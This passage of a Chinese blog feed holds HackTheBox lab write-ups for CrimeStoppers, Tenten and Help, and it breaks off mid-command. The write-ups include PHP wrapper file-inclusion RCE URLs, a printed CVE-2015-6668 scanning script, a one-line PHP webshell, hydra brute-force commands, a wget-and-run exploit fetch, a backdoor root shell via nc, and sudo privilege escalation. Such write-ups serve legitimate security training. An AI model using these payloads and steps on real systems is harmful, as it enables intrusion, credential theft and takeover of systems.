id="NTFS数据流"><a href="#NTFS数据流" class="headerlink" title="NTFS数据流"></a>NTFS数据流</h2><p>在查看了电脑的管理者账户的桌面后，来源于 SysInternals Suite 的 streams.exe 文件被上传，user及root flag就可以得到了。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-032.png" alt="123-032"></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2019/05/02/CrimeStoppers-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <url>/2019/05/02/CrimeStoppers-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<hr><p>title: CrimeStoppers-PHP伪协议在文件包含中的妙用<br>categories:</p><ul><li>CTF<br>tags:</li><li>CTF</li></ul><hr><p>hackthebox是一个在线的渗透平台，废话不多说，现在来学习如何利用web常见漏洞——PHP文件包含。最后的提权方式涉及到了反汇编的内容。</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-008.png" alt="new-008"></p><p>Nmap显示只有一个Apache 服务器在默认端口上运行。</p><p>Dirbuster目录探测</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-013.png" alt="new-013"></p><p>测试Web服务器会显示相当多的PHP脚本，但是尝试访问大多数脚本会显示是空白页。这个暗示了文件是被其他脚本包含引用的。</p><p>用burp抓包，发现cookie参数为 <code>admin=0</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-018.png" alt="new-018"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-019.png" alt="new-019"></p><p>修改cookie <code>admin=1</code>，可以发现多出来list这个网页，获得文件上传后的地址。</p><h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/1.PNG"></p><p>很明显，op参数用于在当前工作目录中包含一个php文件。通过使用php过滤器将目标文件转换为base64，可以获得php文件的源代码。</p><p><code>http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index</code></p><p>这一请求将输出以base64格式编码的 index.php 的内容。这说明了两件事，1：本地文件包含漏洞验证了存在，2：可以使用php伪协议</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-024.png" alt="new-024"></p><h2 id="PHP-ZIP-wrapper-二进制数据上传"><a href="#PHP-ZIP-wrapper-二进制数据上传" class="headerlink" title="PHP ZIP wrapper/二进制数据上传"></a>PHP ZIP wrapper/二进制数据上传</h2><p>再次使用op参数，可以使用 php wrappers 在ZIP压缩文件中包含一个文件。</p><p><code>http://10.10.10.80/?op=zip://uploads/&lt;LAB IP&gt;/FILENAME#writeup.php?cmd=id</code> </p><p>这里的FILENAME是tip/zip文件的hash。</p><p>通过burp拦截tip提交请求，并输入zip文件的原始数据，可以利用上述技术实现远程代码执行。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-029.png" alt="new-029"></p><p>在上面的例子中，隐藏名是 <code>9dfc0e1200ee90d2a380c2fcd2ff036754be27b4</code></p><p>通过结合使用zip打包器，可以通过zip中包含的writeup.php文件执行命令。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-034.png" alt="new-034"></p><p><code>http://10.10.10.80/？op=zip://uploads/10.10.14.4/9dfc0e1200ee90d2a380c2fcd2ff036754be27b4%23writeup&amp;cmd=id</code></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>浏览dom用户目录会发现安装了一个Thunderbird。只需复制文件并在本地加载Thunderbird中的配置文件，或运行strings global-messages-db.sqlite上运行字符串，将会提供一个提示，建议被识别为后门的Apache模块rkhunter。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/3.PNG" alt="new-039"></p><p>火狐解密：<code>https://github.com/unode/firefox_decrypt</code></p><p>通过使用上述工具，可以恢复dom的密码。因为默认情况下，Thunderbird没有设置主密码，所以恢复密码很简单。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-039.png" alt="new-039"></p><p>运行<code>netstat-lp</code>命令可以显示ssh正在侦听ipv6。使用<code>ifconfig</code>或<code>ip addr</code>可以很容易地获得目标的ipv6地址。结合从Thunderbird获得的凭证，可以用dom作为用户，ssh直接连入。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>检查IDA中的<code>mod_rootme.so</code>文件，会发现一个DarkArmy函数。进一步检查发现，该函数使用十六进制字符串对文本“HackTheBox”进行了异或。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-044.png" alt="new-044"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-045.png" alt="new-045"></p><p>因为Hack the box （用XOR计算器进行异或计算）结果为 <code>e140d383b0b0c271b01</code>，我们发现了后门密码。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-050.png" alt="new-050"></p><p>一旦获得了密码短语，利用后门就很简单了。只需运行命令<code>nc 10.10.10.80 80</code> ，然后输入GET FunSociety，就会获得一个root shell。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-11/new-051.png" alt="new-051"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>有趣的本地文件包含方式：</p><p><a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Tenten（sudo -l）</title>
    <link href="/2019/05/01/03-x/"/>
    <url>/2019/05/01/03-x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.10</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> ec:f7:<span class="hljs-number">9</span>d:<span class="hljs-number">38</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">47</span>:<span class="hljs-number">6</span>f:f0:<span class="hljs-number">13</span>:<span class="hljs-number">0</span>f:b9:<span class="hljs-number">3</span>b:d4:d6:e3:<span class="hljs-number">11</span> (RSA)<br>|   <span class="hljs-type">256</span> cc:fe:<span class="hljs-number">2</span>d:e2:<span class="hljs-number">7</span>f:ef:<span class="hljs-number">4</span>d:<span class="hljs-number">41</span>:ae:<span class="hljs-number">39</span>:<span class="hljs-number">0</span>e:<span class="hljs-number">91</span>:ed:<span class="hljs-number">7</span>e:<span class="hljs-number">9</span>d:e7 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">8</span>d:b5:<span class="hljs-number">83</span>:<span class="hljs-number">18</span>:c0:<span class="hljs-number">7</span>c:<span class="hljs-number">5</span>d:<span class="hljs-number">3</span>d:<span class="hljs-number">38</span>:df:<span class="hljs-number">4</span>b:e1:a4:<span class="hljs-number">82</span>:<span class="hljs-number">8</span>a:<span class="hljs-number">07</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-generator: WordPress <span class="hljs-number">4.7</span><span class="hljs-number">.3</span><br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: Job Portal &amp;#<span class="hljs-number">8211</span>; Just another WordPress site<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><p>command: <code>wpscan --url 10.10.10.10 --enumerate</code></p><p>useful info: </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span>/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> (Ubuntu)<br><span class="hljs-attribute">WordPress</span> version <span class="hljs-number">4</span>.<span class="hljs-number">7</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">valid</span> user: takis<br><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.10</span>/wp-login.php<br></code></pre></div></td></tr></table></figure><ul><li>trying1<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/1.PNG" alt="1"><br>WordPress 2.3-4.8.3 - Host Header Injection in Password Reset</li></ul><p>这是第二次遇到低版本wordpress，并验证主机头注入了，但第一次是邮件发送插件未安装，第二次直接500服务器错误。无语。</p><ul><li><p>trying2<br>takis，以该用户名，burp intruder尝试弱密码。</p></li><li><p>trying3<br>openssh验证有效的用户，尝试弱密码<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/2.PNG" alt="2"></p></li></ul><p>hydra -l takis -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh</p><p>hydra -l takis -P /usr/share/wordlists/rockyou.txt -I 10.10.10.10 ssh -t 4</p><p>结果：<br> [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</p><ul><li>trying4：exp查找<br>search type:exploit wordpress cve:2016</li></ul><hr><p>像这种cms，又没检查出弱密码，又没有检查出可用exp，菜的不行==</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>当时我用wpscan，检查过了插件job manager。由于只有xss漏洞，所以没有在意。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/4.PNG" alt="4"></p><p>32 vulnerabilities identified:     –》 wpscan扫描结果有32个漏洞，再加上youtube上看到一些0day的exp演示视频，高大上的不行。成功把我这只菜鸟给绕糊涂了。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/3.PNG" alt="3"></p><p><a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&quot;&quot;  </span><br><span class="hljs-string">CVE-2015-6668  </span><br><span class="hljs-string">Title: CV filename disclosure on Job-Manager WP Plugin  </span><br><span class="hljs-string">Author: Evangelos Mourikis  </span><br><span class="hljs-string">Blog: https://vagmour.eu  </span><br><span class="hljs-string">Plugin URL: http://www.wp-jobmanager.com  </span><br><span class="hljs-string">Versions: &lt;=0.7.25  </span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br>website = raw_input(<span class="hljs-string">&#x27;Enter a vulnerable website: &#x27;</span>)  <br>filename = raw_input(<span class="hljs-string">&#x27;Enter a file name: &#x27;</span>)<br><br>filename2 = filename.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;-&quot;</span>)<br><br><span class="hljs-keyword">for</span> year <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2016</span>,<span class="hljs-number">2018</span>):  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):<br>        <span class="hljs-keyword">for</span> extension <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>&#125;:<br>            URL = website + <span class="hljs-string">&quot;/wp-content/uploads/&quot;</span> + <span class="hljs-built_in">str</span>(year) + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-string">&quot;&#123;:02&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i) + <span class="hljs-string">&quot;/&quot;</span> + filename2 + <span class="hljs-string">&quot;.&quot;</span> + extension<br>            req = requests.get(URL)<br>            <span class="hljs-keyword">if</span> req.status_code==<span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] URL of CV found! &quot;</span> + URL<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/5.PNG" alt="5"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">04</span>/HackerAccessGranted.jpg<br><br>steghide extract -sf HackerAccessGranted.jpg<br><br>superpassword（通过hydra可得到）<br><br>chmod <span class="hljs-number">400</span> id_rsa<br>ssh -i id_rsa takis@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br><br>成功连接：<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> takis on tenten:<br>    env_reset, mail_badpass,<br>    secure_path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin\:/u</span>sr<span class="hljs-regexp">/local/</span>bin\:<span class="hljs-regexp">/usr/</span>sbin\:<span class="hljs-regexp">/usr/</span>bin\:<span class="hljs-regexp">/sbin\:/</span>bin\:<span class="hljs-regexp">/snap/</span>bin<br><br>User takis may run the following commands on tenten:<br>    (ALL : ALL) ALL<br>    (ALL) NOPASSWD: <span class="hljs-regexp">/bin/</span>fuckin<br><br>---<br>file <span class="hljs-regexp">/bin/</span>fuckin<br><span class="hljs-regexp">/bin/</span>fuckin: Bourne-Again shell script, ASCII text executable<br><br>---<br>cat <span class="hljs-regexp">/bin/</span>fuckin<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span> <span class="hljs-variable">$4</span><br></code></pre></div></td></tr></table></figure><p>对bash script变量不是很熟悉，于是在本地写一个，运行试一下。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-01-03/6.PNG" alt="6"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$1</span> 代表给脚本传递的第一个参数<br><br><span class="hljs-variable">$2</span> 传递的第二个参数，以此类推<br><br>sudo <span class="hljs-regexp">/bin/</span>fuckin su<br>因为<span class="hljs-regexp">/bin/</span>fuckin不需要输入密码，并且以root运行，所以运行了su，获得root用户。<br><br><span class="hljs-comment">## 总结</span><br>要点是扫描到HackerAccessGranted的目录，通过cv文件名泄露漏洞，通过隐写术获取到id_rsa以及隐藏的密码<br><br>ssh登陆后，sudo -l利用权限错误，执行root权限即可。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Help(File upload)</title>
    <link href="/2019/04/25/02-x/"/>
    <url>/2019/04/25/02-x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.121</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.6</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> e5:bb:<span class="hljs-number">4</span>d:<span class="hljs-number">9</span>c:de:af:<span class="hljs-number">6</span>b:bf:ba:<span class="hljs-number">8</span>c:<span class="hljs-number">22</span>:<span class="hljs-number">7</span>a:d8:d7:<span class="hljs-number">43</span>:<span class="hljs-number">28</span> (RSA)<br>|   <span class="hljs-type">256</span> d5:b0:<span class="hljs-number">10</span>:<span class="hljs-number">50</span>:<span class="hljs-number">74</span>:<span class="hljs-number">86</span>:a3:<span class="hljs-number">9</span>f:c5:<span class="hljs-number">53</span>:<span class="hljs-number">6</span>f:<span class="hljs-number">3</span>b:<span class="hljs-number">4</span>a:<span class="hljs-number">24</span>:<span class="hljs-number">61</span>:<span class="hljs-number">19</span> (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> e2:<span class="hljs-number">1</span>b:<span class="hljs-number">88</span>:d3:<span class="hljs-number">76</span>:<span class="hljs-number">21</span>:d4:<span class="hljs-number">1</span>e:<span class="hljs-number">38</span>:<span class="hljs-number">15</span>:<span class="hljs-number">4</span>a:<span class="hljs-number">81</span>:<span class="hljs-number">11</span>:b7:<span class="hljs-number">99</span>:<span class="hljs-number">07</span> (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: Apache2 Ubuntu Default Page: It works<br><span class="hljs-number">3000</span>/tcp open  http    Node.js Express framework<br>|<span class="hljs-type">_http</span>-title: Site doesn&#x27;t have a title (application/json; charset=utf<span class="hljs-number">-8</span>).<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问10.10.10.121:80，Apache/2.4.18 (Ubuntu) ，默认配置页面</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span>:<span class="hljs-number">80</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span><span class="hljs-regexp">/support/</span><br>页面上的登陆表单，有csrf参数，不允许爆破弱口令<br><br>换一个字典<br>apache-user-enum-<span class="hljs-number">1.0</span>.txt<br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span>:<span class="hljs-number">80</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/apache-user-enum-<span class="hljs-number">1.0</span>.txt<br></code></pre></div></td></tr></table></figure><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><ul><li>gobuster -u <a href="http://10.10.10.121/support/">http://10.10.10.121:80/support/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">/uploads (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>)<br>/css (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>)<br>/includes (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>)<br>存在上传目录，<span class="hljs-number">302</span>跳转到apache默认配置页面<br></code></pre></div></td></tr></table></figure></li><li>gobuster -u <a href="http://10.10.10.121/support/uploads">http://10.10.10.121/support/uploads</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">/articles (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>)<br>/tickets (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>)<br></code></pre></div></td></tr></table></figure></li><li>gobuster -u <a href="http://10.10.10.121/support/uploads/tickets">http://10.10.10.121/support/uploads/tickets</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</li></ul><h4 id="exp尝试"><a href="#exp尝试" class="headerlink" title="exp尝试"></a>exp尝试</h4><ul><li>searchsploit help deskZ</li></ul><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">HelpDeskZ</span> <span class="hljs-string">&lt;=</span> <span class="hljs-string">v1.0.2</span> <span class="hljs-bullet">-</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">Shell</span> <span class="hljs-string">Upload</span><br><span class="hljs-string">HelpDeskZ</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">1.0</span><span class="hljs-number">.2</span> <span class="hljs-bullet">-</span> <span class="hljs-string">(Authenticated)</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Injection</span> <span class="hljs-string">/</span> <span class="hljs-string">Unauthorized</span> <span class="hljs-string">File</span> <span class="hljs-string">Download</span><br><br><span class="hljs-string">searchsploit</span> <span class="hljs-string">-m</span> <span class="hljs-string">exploits/php/webapps/40300.py</span><br><span class="hljs-string">python</span> <span class="hljs-number">40300.</span><span class="hljs-string">py</span>  <span class="hljs-string">http://10.10.10.121:80/support/</span> <span class="hljs-string">ports.txt</span><br><span class="hljs-string">失败</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">python</span> <span class="hljs-number">40300.</span><span class="hljs-string">py</span> <span class="hljs-string">http://10.10.10.121/support/uploads/tickets</span> <span class="hljs-string">whale.php</span><br><br><span class="hljs-string">连接错误</span><br><span class="hljs-attr">requests.exceptions.ConnectionError:</span> <span class="hljs-string">HTTPConnectionPool(host=&#x27;10.10.10.121&#x27;,</span> <span class="hljs-string">port=80):</span> <span class="hljs-attr">Max retries exceeded with url:</span> <span class="hljs-string">/support/uploads/tickets/1cd2ed348346b00c48d3f78579d6431d.php</span> <span class="hljs-string">(Caused</span> <span class="hljs-string">by</span> <span class="hljs-string">NewConnectionError(&#x27;&lt;urllib3.connection.HTTPConnection</span> <span class="hljs-string">object</span> <span class="hljs-string">at</span> <span class="hljs-number">0x7f0def11a290</span><span class="hljs-string">&gt;:</span> <span class="hljs-attr">Failed to establish a new connection:</span> [<span class="hljs-string">Errno</span> <span class="hljs-number">110</span>] <span class="hljs-string">Connection</span> <span class="hljs-string">timed</span> <span class="hljs-string">out&#x27;,))</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">searchsploit</span> <span class="hljs-string">-m</span> <span class="hljs-string">exploits/php/webapps/41200.py</span><br><span class="hljs-string">需要一个可以登陆的口令</span><br></code></pre></div></td></tr></table></figure><ul><li>尝试文件上传</li></ul><p><code>http://10.10.10.121/support/?v=submit_ticket&amp;action=displayForm</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/5.PNG" alt="5"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/6.PNG" alt="6"></p><ul><li>尝试github的exp</li></ul><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/trevlee/</span>helpdeskz_exploit<span class="hljs-regexp">/master/</span>exploit<br><br>python exploit<br><br>python exploit http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span><span class="hljs-regexp">/support/u</span>ploads/tickets whale.php<br></code></pre></div></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/trevlee/helpdeskz_exploit/master/exploit">https://raw.githubusercontent.com/trevlee/helpdeskz_exploit/master/exploit</a></p><p>观察exp，是通过时间推算出上传的php脚本的名称，然后组合baseurl，查看状态码是否是200。</p><p>如果是200，说明上传成功。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/2.PNG" alt="2"></p><p>首先上传一个php脚本，上传地址参考上述步骤“尝试文件上传”,内容为<code>&lt;?php echo(system($_GET[&quot;cmd&quot;])); ?&gt;</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-25-02/1.PNG" alt="1"></p><p>成功上传webshell</p><h2 id="3000-port"><a href="#3000-port" class="headerlink" title="3000 port"></a>3000 port</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span>:<span class="hljs-number">3000</span><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Hi Shiv, To get access please find the credentials with given query&quot;</span>&#125;<br><br>X-Powered-By: Express<br><br>searchsploit Express<br>searchsploit Node.js<br><br>nikto -h http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span>:<span class="hljs-number">3000</span> &gt; nikto.txt<br><br>gobuster -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.121</span>:<span 